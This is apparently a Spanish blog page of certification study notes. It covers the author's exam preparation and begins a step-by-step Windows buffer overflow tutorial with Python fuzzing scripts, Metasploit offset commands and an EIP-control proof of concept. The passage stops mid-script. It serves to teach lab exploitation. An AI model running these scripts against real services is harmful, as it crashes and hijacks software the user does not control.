<li><a href="#padding-oracle-attack">Padding Oracle Attack</a>   </li>
<li><a href="#wordpress">WordPress</a></li>
<li><a href="#php-reverse-shell-manual-multifuncional">PHP Reverse Shell Manual Multifuncional</a>       </li>
<li><a href="#asp-aspx-reverse-shell">ASP/ASPX Reverse Shell</a></li>
<li><a href="#notcpshell">NoTCPShell</a> </li>
<li><a href="#bypass-file-upload-filtering">Bypass File Upload Filtering</a></li>
<li><a href="#xml-external-entity-injection">XML External Entity Injection</a></li>
<li><a href="#x-jenkins">X-Jenkins Remote Code Execution</a></li>
<li><a href="#php-cgi-exploitation">PHP-CGI Exploitation</a></li>
<li><a href="#waf-bypassing">WAF Bypassing</a></li>
<li><a href="#pentesting-linux">Pentesting Linux</a><ul>
<li><a href="#tratamiento-de-la-tty">Tratamiento de la TTY</a></li>
<li><a href="#process-monitoring">Monitorizado de Procesos a Tiempo Real</a></li>
<li><a href="#escaping-restricted-shell">Escaping Restricted Shell</a></li>
<li><a href="#pivoting-con-shuttle">Pivoting con Shuttle</a></li>
<li><a href="#port-knocking">Port Knocking</a></li>
</ul>
</li>
<li><a href="#pentesting-windows">Pentesting Windows</a><ul>
<li><a href="#transferencia-de-archivos">Transferencia de Archivos</a></li>
<li><a href="#av-evasion-genetic-malware">Evasión de Antivirus con Malware Genético</a></li>
<li><a href="#windows-port-forwarding">Port Forwarding y Técnicas de Enrutamiento</a></li>
<li><a href="#hashdump-manual">Hashdump Manual</a></li>
<li><a href="#passthehash">PassTheHash</a></li>
<li><a href="#enumeration-and-privilege-escalation">Enumeration &amp; Privilege Escalation</a></li>
<li><a href="#powershell-reverse-shell">Powershell Reverse Shell</a></li>
<li><a href="#manual-migration-process">Migración manual a proceso a 64 bits</a></li>
<li><a href="#rce-filter-evasion-microsoft-sql">RCE Filter Evasion Microsoft SQL</a></li>
<li><a href="#mssqlclient-impacket">Conexión al Servicio Microsoft SQL con mssqclient.py de Impacket</a></li>
<li><a href="#reconocimiento-del-sistema">Reconocimiento del Sistema</a></li>
<li><a href="#kernel-exploits-windows">Kernel Exploits Windows</a></li>
<li><a href="#privilege-escalation-enumerations">Privilege Escalation Enumerations</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="antecedentes">Antecedentes<a class="headerlink" href="#antecedentes" title="Permanent link">&para;</a></h1>
<p>Antes que nada me gustaría comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le sirva de inspiración para aquel que pretenda sacarse la certificación.</p>
<h4 id="es-dificil-la-certificacion">¿Es difícil la certificación?<a class="headerlink" href="#es-dificil-la-certificacion" title="Permanent link">&para;</a></h4>
<p><img alt="Certificado Físico" src="http://funkyimg.com/i/2Ptt9.jpg" /></p>
<p>Diría que la respuesta es relativa, siempre va a depender de la soltura que tengas con máquinas de tipo <em>CTF/Challenge</em>. </p>
<p>A mi por ejemplo la plataforma <strong>HackTheBox</strong> me ha servido de mucho para coger todo el fondo que tengo a día de hoy, así como <strong>VulnHub</strong> u <strong>OverTheWire</strong>. De hecho, lo que más me sorprendió a la hora de ir haciendo las máquinas del laboratorio fue la gran similitud con las máquinas de HackTheBox. Hablando en términos comparativos, os puedo decir que efectivamente corresponden a las de nivel medio de HTB, tal y como llegué a leer en su momento en algunos artículos de gente que había pasado con éxito la certificación.</p>
<p>Eso si, la certificación fue dura, de las más duras que he hecho en mi vida, con mis momentos de desesperación en los que no llegaba a ver las cosas claras, sobre todo por la nueva modalidad <strong>Proctored</strong>, que quieras o no pone un poco nervioso. Mi consejo en este punto es que no tires nunca la toalla, ni aunque quede 1 hora de examen. De hecho, fue justamente 2 horas antes de acabar el examen cuando lo iba a dar todo por perdido hasta que se me ocurrió un vector de ataque que milagrosamente funcionó y logré explotar con éxito comprometiendo otro de los sistemas de la red (con escalada de privilegios incluido).</p>
<p>Para que te quedes tranquilo, si juegas mucho con máquinas de tipo CTF y te entrenas día a día con retos desafiantes que te hagan pensar, no tienes de qué preocuparte.</p>
<h4 id="que-plan-me-pillo">¿Qué plan me pillo?<a class="headerlink" href="#que-plan-me-pillo" title="Permanent link">&para;</a></h4>
<p>En mi caso me llegué a pillar el plan de 3 meses, lo que se resume en unos 1.100 euros practicamente. </p>
<p>Os puedo decir que en 1 mes ya tenía casi todas las máquinas hechas menos 4 de ellas que me siguieron quedando pendientes y no llegué a hacer (Eran las más Hard y vi que escapaban demasiado de la metodología del examen).</p>
<p>El segundo mes lo utilicé para seguir con HackTheBox así como para repasar las máquinas hechas y probar vías alternativas de resolver las mismas.</p>
<p>En base a cómo lo he vivido yo, os recomendaría más bien 2 meses de laboratorio, sobre todo por lo que me comentaba un gran compañero <strong>Julio Ureña</strong>, de que uno tiende a relajarse cuando tiene mucho tiempo por delante.</p>
<h4 id="que-bases-tuve-antes-de-comenzar-con-la-certificacion">¿Qué bases tuve antes de comenzar con la certificación?<a class="headerlink" href="#que-bases-tuve-antes-de-comenzar-con-la-certificacion" title="Permanent link">&para;</a></h4>
<p>A nivel de Pentesting, en VulnHub tenía 30 máquinas, en OverTheWire 6 de los retos principales y en HackTheBox 55 máquinas con permisos de administrador en cada una de ellas.</p>
<p>A nivel de Sistemas y programación, con muy buenas bases de Linux Avanzado, programación en Bash Avanzado y ligero tanto de Windows como de Python. Sí que es cierto que la certificación me hizo meterme más a fondo con Windows, así como con la programación en Python, de ahí me motivé de hecho para hacer la herramienta <strong>spoofMe</strong> para el Spoofing de llamadas y mensajería instantánea. </p>
<p>A su vez a esto le sumo las auditorías reales de empresa que hago como Pentester en EnigmaSec, donde el hecho de practicar también en entornos reales me hace ver las cosas desde otra perspectiva.</p>
<p>Por último, a nivel de Búffer Overflow, no sabía hacer nada... entré con la mente en blanco a la certificación. Sin embargo, en 4 días ya sabía hacer todos los ejercicios del laboratorio en base a la guía y a los vídeos de apoyo con los que cuentas en el material que te dan.</p>
<h4 id="que-horarios-de-estudio-seguias">¿Qué horarios de estudio seguías?<a class="headerlink" href="#que-horarios-de-estudio-seguias" title="Permanent link">&para;</a></h4>
<p>Esto tal vez ha sido lo más mortal, desafiante, doloroso pero a su vez fructífero. Estuve aplicando <strong>Uberman</strong> durante los 3 meses de preparación, una técnica de sueño polifásico que hace que con tan sólo dormir 3 horas seguidas aplicando posteriormente descansos de 20 minutos a intervalos regulares de tiempo puedas estar activo y despierto (Que no falten los que me conocen de cerca y me llamaban loco).</p>
<p>Decidí aplicarlo porque básicamente el día se pasaba muy rápido, cuando uno está trabajando tiene prioridades y debe anteponer las tareas y proyectos frente a lo demás. Para poder dedicarle tiempo de estudio al laboratorio, estuve sobre todo el primer mes aplicando a fondo la técnica, estudiando y practicando aproximadamente desde las 7 de la tarde hasta las 5 de la mañana.</p>
<p>He de decir que también es un gran puñado de motivación lo que hace que estés dispuesto a hacer esto, en caso contrario ni lo habría intentado. Aún así no lo recomiendo hacer, pues es perjudicial para la salud, pero dependerá de cada cual como pretenda organizarse sus horas de estudio.</p>
<h4 id="que-pasos-me-recomiendas-para-abordar-con-exito-la-certificacion">¿Qué pasos me recomiendas para abordar con éxito la certificación?<a class="headerlink" href="#que-pasos-me-recomiendas-para-abordar-con-exito-la-certificacion" title="Permanent link">&para;</a></h4>
<p>En primer lugar hacerte una cuenta de <strong>HackTheBox</strong>, incluso te diría de pagarte la cuenta VIP para tener acceso a las máquinas retiradas. Tienes a tu disposición canales en Youtube como el de <strong>ippsec</strong>, que te explica paso a paso todas las máquinas retiradas con técnicas bastante chulas tanto de explotación en Windows como en Linux.</p>
<p>Te recomiendo practicar en este tipo de entornos todo lo que puedas, pues son los que te harán ver una vez comiences con el laboratorio que hay bastante similitud y que no es tan costoso. Para las máquinas del laboratorio, te darás cuenta de que los entornos están un poco "deprecated", en el sentido de que son máquinas algo antiguas con arquitectura de 32 bits. A la hora de abordar estas máquinas, mi consejo es que no trates de explotarlas haciendo uso de exploits modernos, pues están pensadas para que practiques distintas vías de explotación con técnicas no tan actuales, lo que hace que ganes más fondo.</p>
<h4 id="que-es-lo-mas-duro-de-la-certificacion">¿Qué es lo más duro de la certificación?<a class="headerlink" href="#que-es-lo-mas-duro-de-la-certificacion" title="Permanent link">&para;</a></h4>
<p>La gestión del tiempo. Mi recomendación y por lo que he escuchado de los demás y coincido, es empezar con el Búffer Overflow a la hora de abordar el examen. Teniendo cierta soltura no te debería de llevar más de 1 hora.</p>
<p>Una vez hecho, ya cuentas con 25 puntos del examen. El siguiente paso es saltar a la máquina de 10 puntos, suele ser una explotación rápida y directa como administrador del sistema. Con estos 35 puntos bajo la manga, lo más recomendable es dedicarle un buen tiempo a la otra máquina de 25 puntos, pues en caso de sacarla, estarías a 60 puntos y con conseguir el User de alguno de los otros 2 sistemas de 20 puntos ya estarías aprobado (Intenta aspirar a más y hazlas todas :P).</p>
<p>En cuanto al laboratorio, es justamente el entorno deprecated lo que hace un poco tediosa la compilación y ejecución de exploits, pues en la mayoría de las veces te dará una petada de las importantes. Pero no te frustres, siempre con un poco de café y buena actitud se saca.</p>
<h4 id="cuales-son-los-siguientes-pasos">¿Cuáles son los siguientes pasos?<a class="headerlink" href="#cuales-son-los-siguientes-pasos" title="Permanent link">&para;</a></h4>
<p>Como siempre, uno nunca debe dejar de hacer lo que le gusta... y aún me queda un puñado de cosas por aprender. Será cuestión de seguir aprendiendo lo que hará que aparezca una respuesta a esta pregunta.</p>
<p>Sin más, ¡os dejo con toda la preparación del curso!</p>
<h1 id="buffer-overflow-windows">Buffer Overflow Windows<a class="headerlink" href="#buffer-overflow-windows" title="Permanent link">&para;</a></h1>
<p>A continuación, se listan los pasos a seguir para la correcta explotación del Buffer Overflow en Windows (32 bits). Para la examinación, no se requieren de conocimientos avanzados de exploiting en BoF (bypassing ASLR, etc.), basta con practicar con servicios básicos y llevar esa misma metodología al examen.</p>
<p>Servicios/Máquinas con los que practicar:</p>
<ul>
<li>SLMail 5.5 </li>
<li>Minishare 1.4.1</li>
<li>Máquina Brainpan de VulnHub</li>
<li>Los 2 binarios personalizados compartidos en la máquina Windows personal del laboratorio</li>
</ul>
<p>Generalmente, la metodología a seguir es la que se describe a continuación.</p>
<h4 id="fuzzing">Fuzzing<a class="headerlink" href="#fuzzing" title="Permanent link">&para;</a></h4>
<p>Para esta fase, es necesario en primer lugar identificar el campo en el que se produce el buffer overflow. Para un caso práctico, suponiendo por ejemplo que un servicio sobre un Host 192.168.1.45 corre bajo el puerto 4000 y que tras la conexión vía TELNET desde nuestra máquina, se nos solicita un campo USER a introducir, podemos elaborar el siguiente script en python con el objetivo de determinar si se produce un desbordamiento de búffer:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1"># coding: utf-8</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;dirección-ip&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;A&quot;</span><span class="p">]</span>
<span class="n">ipAddress</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">4000</span>
<span class="n">contador</span> <span class="o">=</span> <span class="mi">100</span>

<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">30</span><span class="p">:</span>
  <span class="n">buffer</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">contador</span><span class="p">)</span>
  <span class="n">contador</span> <span class="o">+=</span> <span class="mi">200</span>

<span class="k">for</span> <span class="n">strings</span> <span class="ow">in</span> <span class="n">buffer</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;Enviando </span><span class="si">%s</span><span class="s2"> bytes...&quot;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">strings</span><span class="p">)</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;USER &quot;</span> <span class="o">+</span> <span class="n">strings</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
  <span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error de conexión...</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>De esta forma, a través de una lista, vamos almacenando en la variable <strong>buffer</strong> el caracter "A" un total 30 veces con un incremento para cada una de las iteraciones en 200. </p>
<p>Esto es:</p>
<p><strong>[1 caracter "A", 100 caracteres "A", 300 caracteres "A", 500 caracteres "A", 700 caracteres "A", ...]</strong></p>
<p>Mientras tanto, desde <em>Immunity Debugger</em>, estando previamente sincronizados con el proceso, deberemos de utilizarlo como debugger para ver en qué momento se produce una violación de segmento.</p>
<p>Cuando esto ocurra, deberíamos ver como el registro <strong>EIP</strong> toma el valor (<strong>41414141</strong>), correspondiente al caracter "A" en hexadecimal.</p>
<p>Lo bueno de haber creado la lista, es que podemos identificar rápidamente entre qué valores se produce el Búffer Overflow, en otras palabras, si vemos que tras la ejecución de nuestro script en Python el último reporte que se hizo fue <strong>"Enviando 700 bytes..."</strong>, lo conveniente es modificar nuestro script al siguiente contenido:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1"># coding: utf-8</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;dirección-ip&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">900</span>
<span class="n">ipAddress</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">4000</span>

<span class="k">try</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;Enviando búffer...&quot;</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;USER &quot;</span> <span class="o">+</span> <span class="n">buffer</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error de conexión...</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>Siempre para asegurar es mejor mandarle los 200 caracteres siguientes de nuestro reporte. Tras la ejecución de esta variante, <strong>Immunity Debugger</strong> directamente nos debería reportar la violación de segmento con el valor <strong>41414141</strong> en el registro <strong>EIP</strong>, lo cual hace que ya tengamos una aproximación de tamaño del buffer permitido.</p>
<p>Para que te quedes tranquilo, en el examen te entregarán un script en Python a modo de PoC donde se aplica un desbordamiento de búffer sobre el servicio. Contando con esto, es simplemente ir haciendo los pasos que se enumeran a continuación.</p>
<h4 id="calculando-el-offset">Calculando el Offset<a class="headerlink" href="#calculando-el-offset" title="Permanent link">&para;</a></h4>
<p>Dado que el valor 414141 para el EIP no es algo descriptivo que nos permita hacernos la idea de qué tamaño tiene el buffer permitido, lo que hacemos es aprovecharnos de las utilidades <strong>pattern_create</strong> y <strong>pattern_offset</strong> de Metasploit.</p>
<p>La funcionalidad <strong>pattern_create</strong> nos permitirá generar un puñado de caracteres aleatorios en base a una longitud fijada como criterio. </p>
<p>Ejemplo:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb<span class="w"> </span>-l<span class="w"> </span><span class="m">100</span>

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9
</code></pre></div>

<p>Para el ejemplo mostrado, hemos generado 900 bytes de caracteres aleatorios, lo único que tendríamos que hacer es sustituir el caracter "A" de nuestra variable <em>buffer</em> por el contenido que <strong>pattern_create</strong> nos ha devuelto:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1"># coding: utf-8</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;dirección-ip&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9&quot;</span>

<span class="n">ipAddress</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">4000</span>

<span class="k">try</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;Enviando búffer...&quot;</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;USER &quot;</span> <span class="o">+</span> <span class="n">buffer</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error de conexión...</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>Lo que conseguimos con esto es determinar a través del valor del registro <strong>EIP</strong> desde <strong>Immunity Debugger</strong> una vez se produce la violación de segmento, qué caracteres están sobreescribiendo dicho registro.</p>
<p>Supongamos que el registro <strong>EIP</strong> toma este valor tras la detención del servicio una vez producido el desbordamiento:</p>
<p><strong>EIP -&gt; 39426230</strong></p>
<p>A fin de realizar su traducción y ver qué caracteres de nuestro búffer corresponden a estos valores, podemos aplicar el siguiente comando desde terminal:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;\0x39\0x42\0x62\0x30&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xxd<span class="w"> </span>-ps<span class="w"> </span>-r

9Bb0
</code></pre></div>

<p>Lo que hace que inmediatamente veamos los caracteres a los que corresponden dichos valores. Una vez identificados, podemos a través del <strong>pattern_offset</strong> de Metasploit calcular el offset, permitiéndonos así conocer ya el tamaño del buffer previo a la sobreescritura del registro EIP:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb<span class="w"> </span>-q<span class="w"> </span>9Bb0

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Exact<span class="w"> </span>match<span class="w"> </span>at<span class="w"> </span>offset<span class="w"> </span><span class="m">809</span>
</code></pre></div>

<h4 id="controlando-el-registro-eip">Controlando el registro EIP<a class="headerlink" href="#controlando-el-registro-eip" title="Permanent link">&para;</a></h4>
<p>Conociendo ya el offset, podemos tomar el control del registro EIP. Dado que el registro <strong>EIP</strong> apunta a la siguiente dirección a ejecutar (pues dirige el flujo del programa), poder sobrescribir su valor es crucial para conseguir una ejecución alternativa del servicio a nivel de sistema (lo veremos más adelante).</p>
<p>Dado que el offset es 809, podemos crear el siguiente PoC a fin de verificar que tenemos el control del registro <strong>EIP</strong>:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1"># coding: utf-8</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;dirección-ip&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">809</span> <span class="o">+</span> <span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">900</span><span class="o">-</span><span class="mi">809</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span>

<span class="n">ipAddress</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">4000</span>

<span class="k">try</span><span class="p">:</span>
  <span class="nb">print</span> <span class="s2">&quot;Enviando búffer...&quot;</span>
